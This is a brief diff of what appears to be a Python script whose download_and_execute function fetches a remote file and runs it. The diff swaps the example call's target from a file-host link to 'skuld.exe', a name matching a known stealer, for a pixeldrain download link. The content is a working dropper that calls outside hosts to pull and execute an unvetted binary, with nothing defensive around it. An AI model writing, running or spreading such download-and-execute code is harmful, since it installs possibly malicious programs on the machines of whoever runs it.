@@ -18,4 +18,4 @@ def download_and_execute(url):
         print("Failed to download the file.")
 
 # Example usage
-download_and_execute("https://31.filelu.com/d/w53ax4lhjq2kvjtahgm46y7or7dx4nt4yn5fvoik2fgzfxz7kjzpj4g4l4tz7ijdfhsa5l5t/skuld.exe")
+download_and_execute("https://pixeldrain.com/api/file/jJfbmLU9?download")
